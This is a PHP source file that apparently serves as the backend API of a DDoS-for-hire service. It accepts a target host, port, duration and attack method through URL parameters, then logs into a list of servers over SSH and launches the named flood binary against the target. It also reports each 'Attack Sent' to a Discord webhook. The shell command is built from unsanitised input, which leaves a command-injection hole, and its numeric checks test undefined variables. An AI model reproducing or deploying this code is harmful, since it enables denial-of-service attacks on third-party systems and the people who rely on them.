<?php
if (!function_exists('ssh2_connect')) //Check if API Hosting servers has ssh2 php module installed
{
        die("Install ssh2 module.\n"); 
}

$webhookurl = "DISCORD WEBHOOK";
$timestamp = date("c", strtotime("now"));

ignore_user_abort(true);
set_time_limit(0);

$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$method = $_GET['method'];
$action = $_GET['action'];
$ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);

$array = array("METHOD_NAME","stop");
$ray = array("API_KEY");

if (!empty($key)){
}else{
die('Error: API key is empty!');}

if (in_array($key, $ray)){
}else{
die('Error: Incorrect API key!');}

if (!empty($time)){
}else{
die('Error: time is empty!');}
 
if (!empty($host)){
}else{
die('Error: Host is empty!');}

if (!empty($method)){
}else{
die('Error: Method is empty!');}

if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}

if ($port > 65535){
die('Error: Ports over 65535 do not exist');}

/* if you want to set a universal time limit uncomment this.
if ($time > 2000){
die('Error: Cannot exceed 2000 seconds!');}
*/

if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
 
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
 
if ($method == "METHOD_NAME") { $command = "screen -dm ./METHOD_NAME $host $port $time"; }
if ($method == "stop") { $command = "pkill $host -f"; }

$SERVERS1 = array(
    "IP"  =>      array("USER", "PASSWORD"),
);


class ssh2 {
    var $connection;
    function __construct($host, $user, $pass) {
            if (!$this->connection = ssh2_connect($host, 22))
                    throw new Exception("Error connecting to server");
            if (!ssh2_auth_password($this->connection, $user, $pass))
                    throw new Exception("Error with login credentials");
    }

    function exec($cmd) {
            if (!ssh2_exec($this->connection, $cmd))
                    throw new Exception("Error executing command: $cmd");

            ssh2_exec($this->connection, 'exit');
            unset($this->connection); //SSH2 Connection function
    }
}

if ($method != "STOP") {
        foreach ($SERVERS1 as $server=>$credentials) {
              $disposable = new ssh2($server, $credentials[0], $credentials[1]);
            $disposable->exec($command);
        }
        $op = ("<div class='area8'>CONSOLE: </div></br><div class='area'>Attack sent to <strong>$host:$port</strong> for <strong>$time</strong> Seconds<br>Using Method: <strong>$method</strong></div></br>");
        echo "$op";

        $json_data = json_encode([    
            "username" => "API",

        
            "embeds" => [
                [
                    "title" => "Attack Detected",

                    // Embed Type
                    "type" => "rich",

                    // Embed Description
                    "description" => "Attack Sent to: **$host**\nPort: **$port**\n For Time: **$time** Seconds\n Using **$method**\n API KEY USED: **$key**\nIP Requested: **$ip**",


                    "timestamp" => $timestamp,

                    "color" => hexdec( "3366ff" ),


                ]
            ]

        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
        
        
}


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );

?>

